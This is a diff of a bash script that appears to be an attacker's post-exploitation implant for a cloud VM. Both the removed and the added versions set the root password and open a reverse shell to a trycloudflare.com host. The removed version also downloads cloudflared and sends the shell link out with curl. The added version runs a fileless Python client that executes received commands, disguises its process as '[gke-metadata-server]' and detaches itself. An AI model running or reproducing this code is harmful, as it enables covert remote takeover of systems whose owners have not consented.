@@ -1,49 +1,42 @@
-#!/bin/bash
-# 1. Reset Root
+# 1. Root Takeover
 echo "root:root" | sudo chpasswd
 
-# 2. Setup Cloudflared
-if [ ! -f /tmp/cloudflared ]; then
-    curl -L --output /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
-    chmod +x /tmp/cloudflared
-fi
+# 2. Fileless Python Injection
+# We use a 'Here-Doc' to feed the code directly into python3
+nohup python3 << 'EOF' > /dev/null 2>&1 &
+import socket, os, subprocess, time, sys
 
-# 3. The "Sentinel" Python C2 Client
-cat <<EOF > /tmp/c2_client.py
-import socket, os, subprocess, time
+# Rename the process to look like a GCP system worker
+try:
+    sys.argv[0] = "[gke-metadata-server]"
+except:
+    pass
+
 def connect():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # Connecting to the LOCAL tunnel port
-            s.connect(('127.0.0.1', 4444))
+            # Replace with your Mac's Public IP or Cloudflare URL
+            s.connect(('merchandise-angeles-jade-stud.trycloudflare.com', 8080))
+            
             while True:
-                s.send((os.getcwd() + " # ").encode())
+                s.send(b"gcp-vm-01:~$ ")
                 data = s.recv(1024).decode("utf-8").strip()
+                
                 if not data or data == "exit": break
+                
+                # Execute commands and return output
                 proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout, stderr = proc.communicate()
                 s.send(stdout + stderr)
             s.close()
         except:
-            time.sleep(5)
+            time.sleep(15) # Reconnect pulse
+
 if __name__ == "__main__":
     connect()
 EOF
 
-# 4. Start the Loop: Shell -> Tunnel -> Your Mac
-nohup bash -c "while true; do
-    # Ensure local C2 listener is ready
-    if ! pgrep -f 'nc -lkp 4444' > /dev/null; then
-        nohup nc -lkp 4444 -e /usr/bin/python3 /tmp/c2_client.py > /dev/null 2>&1 &
-    fi
-    # Ensure Tunnel is active
-    if ! pgrep -f 'tcp://localhost:4444' > /dev/null; then
-        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell.log 2>&1 &
-    fi
-    sleep 20
-    # Send the real Shell Link to your Mac
-    LINK=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell.log | head -n 1)
-    curl -s -X POST -d \"REAL_SHELL: \$LINK\" https://merchandise-angeles-jade-stud.trycloudflare.com
-    sleep 60
-done" > /dev/null 2>&1 &
+# 3. Disown to ensure it survives the shell closing
+disown
+echo "[*] Fileless C2 injected and running in background."
